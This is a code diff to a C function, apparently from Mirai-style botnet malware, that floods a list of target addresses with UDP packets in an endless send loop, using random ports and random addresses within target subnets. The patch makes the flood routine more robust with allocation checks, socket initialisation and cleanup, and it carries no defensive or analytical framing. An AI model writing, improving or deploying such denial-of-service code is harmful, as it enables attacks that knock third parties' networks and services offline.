@@ -19,8 +19,8 @@
 void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
+    char **pkts = NULL;
+    int *fds = NULL;
 
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
@@ -29,6 +29,19 @@ void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
 
     struct sockaddr_in bind_addr = {0};
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) return;
+    
+    fds = calloc(targs_len, sizeof(int));
+    if (!fds) {
+        free(pkts);
+        return;
+    }
+
+    for (i = 0; i < targs_len; i++) {
+        fds[i] = -1;
+    }
 
     if (sport == 0xffff)
     {
@@ -39,11 +52,10 @@ void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
 
     for (i = 0; i < targs_len; i++)
     {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        char *data;
-
-        pkts[i] = calloc(65535, sizeof (char));
+        pkts[i] = calloc(65535, sizeof(char));
+        if (!pkts[i]) {
+            goto cleanup;
+        }
 
         if (dport == 0xffff)
             targs[i].sock_addr.sin_port = rand_next();
@@ -52,25 +64,27 @@ void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
 
         if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
         {
-            return;
+            goto cleanup;
         }
 
         bind_addr.sin_family = AF_INET;
         bind_addr.sin_port = sport;
         bind_addr.sin_addr.s_addr = 0;
 
-        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));
+        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
 
         if (targs[i].netmask < 32)
             targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
-        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
     }
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (fds[i] == -1) continue;
+            
             char *data = pkts[i];
 
             if (data_rand)
@@ -79,4 +93,12 @@ void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
             send(fds[i], data, data_len, MSG_NOSIGNAL);
         }
     }
+
+cleanup:
+    for (i = 0; i < targs_len; i++) {
+        if (pkts[i]) free(pkts[i]);
+        if (fds[i] != -1) close(fds[i]);
+    }
+    free(pkts);
+    free(fds);
 }
